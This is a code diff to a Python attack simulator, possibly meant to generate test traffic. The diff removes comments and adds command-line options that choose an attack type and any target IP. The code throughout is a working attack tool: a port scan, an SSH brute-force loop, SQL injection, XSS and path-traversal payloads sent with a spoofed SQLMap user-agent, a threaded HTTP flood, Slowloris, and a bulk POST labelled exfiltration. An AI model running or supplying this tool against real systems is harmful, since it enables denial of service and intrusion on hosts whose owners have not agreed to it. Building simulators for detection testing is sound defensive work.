@@ -22,10 +22,9 @@ def port_scan(target_ip, port):
         pass
 
 def simulate_ssh_bruteforce(target_ip):
-    # Raw socket SSH brute-force (avoids paramiko dependency)
     usernames = [b"root", b"admin", b"sysadmin"]
     for user in usernames:
-        for _ in range(3): # 3 passwords per user
+        for _ in range(3):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(0.5)
@@ -40,14 +39,13 @@ def simulate_ssh_bruteforce(target_ip):
 
 def simulate_web_attacks(target_ip):
     payloads = [
-        "1' OR '1'='1",              # Classic SQLi
-        "admin' --",                 # SQLi bypass
-        "<script>alert(1)</script>", # Classic XSS
-        "../../../etc/passwd"        # Path Traversal
+        "1' OR '1'='1",
+        "admin' --",
+        "<script>alert(1)</script>",
+        "../../../etc/passwd"
     ]
     for payload in payloads:
         try:
-            # Send payload in the query string
             encoded_payload = urllib.parse.quote(payload)
             url = f"http://{target_ip}/login?user={encoded_payload}"
             req = urllib.request.Request(url, headers={'User-Agent': 'SQLMap/1.4'})
@@ -56,7 +54,6 @@ def simulate_web_attacks(target_ip):
             pass
 
 def simulate_ddos(target_ip):
-    # Rapid-fire HTTP connections
     def http_flood():
         for _ in range(20):
             try:
@@ -64,7 +61,7 @@ def simulate_ddos(target_ip):
             except Exception:
                 pass
     threads = []
-    for _ in range(10): # 10 threads doing 20 requests = 200 rapid requests
+    for _ in range(10):
         t = threading.Thread(target=http_flood)
         t.start()
         threads.append(t)
@@ -72,7 +69,6 @@ def simulate_ddos(target_ip):
         t.join()
 
 def simulate_slowloris(target_ip):
-    # Open connections and hold them open by sending 1 byte periodically
     sockets = []
     try:
         for _ in range(20):
@@ -82,7 +78,6 @@ def simulate_slowloris(target_ip):
             s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n")
             sockets.append(s)
             
-        # Hold them for 5 seconds
         for _ in range(5):
             for s in sockets:
                 try:
@@ -97,60 +92,66 @@ def simulate_slowloris(target_ip):
             s.close()
 
 def simulate_data_exfiltration(target_ip):
-    # Simulate exfiltrating a large file via POST
     try:
         url = f"http://{target_ip}/upload"
-        data = b"A" * (1024 * 1024 * 5) # 5MB of junk data
+        data = b"A" * (1024 * 1024 * 5)
         req = urllib.request.Request(url, data=data, method='POST')
         urllib.request.urlopen(req, timeout=2)
     except Exception:
         pass
 
+import argparse
+
 def main():
-    logging.info("Starting ADVANCED SIMULATED ATTACK (0-days, DoS, Exfiltration)...")
-    
-    # 1. Multi-Threaded Port Scan
-    logging.info("Phase 1: Executing rapid Port Scan on target subnets...")
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        for server in SERVERS:
-            for port in PORTS_TO_SCAN:
-                executor.submit(port_scan, server, port)
-                
-    time.sleep(1)
-    
-    # 2. SSH Brute Force
-    logging.info("Phase 2: Executing SSH Brute-Force...")
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        for server in SERVERS:
-            executor.submit(simulate_ssh_bruteforce, server)
-            
-    time.sleep(1)
-            
-    # 3. Web Attacks (SQLi / XSS)
-    logging.info("Phase 3: Executing Layer 7 Web Attacks (SQLi & XSS)...")
-    with ThreadPoolExecutor(max_workers=5) as executor:
-        for server in SERVERS:
-            executor.submit(simulate_web_attacks, server)
-            
-    time.sleep(1)
-            
-    logging.info("Phase 4: HTTP DDoS Flood...")
-    for server in SERVERS:
-        simulate_ddos(server)
-        
-    time.sleep(1)
-        
-    logging.info("Phase 5: Slowloris (Low & Slow DoS)...")
-    for server in SERVERS:
-        simulate_slowloris(server)
-        
-    time.sleep(1)
-        
-    logging.info("Phase 6: Data Exfiltration (Massive POST)...")
-    for server in SERVERS:
-        simulate_data_exfiltration(server)
-            
-    logging.info("Advanced attack completed.")
+    parser = argparse.ArgumentParser(description="Advanced Attack Simulator")
+    parser.add_argument("--attack", choices=["all", "portscan", "ssh", "web", "ddos", "slowloris", "exfiltration"], default="all", help="Choose the attack type to launch")
+    parser.add_argument("--target", help="Specific target IP (optional, otherwise hits all servers)")
+    args = parser.parse_args()
+
+    targets = [args.target] if args.target else SERVERS
+
+    logging.info(f"Starting ADVANCED SIMULATED ATTACK against {targets}...")
+
+    if args.attack in ["all", "portscan"]:
+        logging.info("Phase 1: Port Scan...")
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            for server in targets:
+                for port in PORTS_TO_SCAN:
+                    executor.submit(port_scan, server, port)
+        time.sleep(1)
+
+    if args.attack in ["all", "ssh"]:
+        logging.info("Phase 2: SSH Brute-Force...")
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            for server in targets:
+                executor.submit(simulate_ssh_bruteforce, server)
+        time.sleep(1)
+
+    if args.attack in ["all", "web"]:
+        logging.info("Phase 3: Layer 7 Web Attacks (SQLi & XSS)...")
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            for server in targets:
+                executor.submit(simulate_web_attacks, server)
+        time.sleep(1)
+
+    if args.attack in ["all", "ddos"]:
+        logging.info("Phase 4: HTTP DDoS Flood...")
+        for server in targets:
+            simulate_ddos(server)
+        time.sleep(1)
+
+    if args.attack in ["all", "slowloris"]:
+        logging.info("Phase 5: Slowloris (Low & Slow DoS)...")
+        for server in targets:
+            simulate_slowloris(server)
+        time.sleep(1)
+
+    if args.attack in ["all", "exfiltration"]:
+        logging.info("Phase 6: Data Exfiltration (Massive POST)...")
+        for server in targets:
+            simulate_data_exfiltration(server)
+
+    logging.info("Attack completed.")
 
 if __name__ == "__main__":
     main()
